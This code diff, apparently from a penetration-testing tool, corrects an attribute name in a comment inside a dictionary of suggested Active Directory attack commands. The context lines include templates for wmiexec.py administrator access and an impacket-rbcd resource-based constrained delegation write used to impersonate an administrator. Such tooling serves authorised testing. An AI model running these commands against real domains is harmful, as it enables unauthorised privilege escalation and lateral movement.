@@ -86,7 +86,7 @@ SUGGESTED_COMMANDS: dict[str, list[str]] = {
         "wmiexec.py -k -no-pass '{domain}/administrator'@{target}",
     ],
     "RBCD": [
-        "# Write msDS-AllowedToActOnBehalfOf on target (requires GenericWrite/WriteDACL)",
+        "# Write msDS-AllowedToActOnBehalfOfOtherIdentity on target (requires GenericWrite/WriteDACL)",
         "impacket-rbcd -delegate-from '{user}$' -delegate-to '{target}$' -dc-ip {dc_ip} '{domain}/{user}:{password}' -action write",
         "",
         "# Get service ticket impersonating administrator",
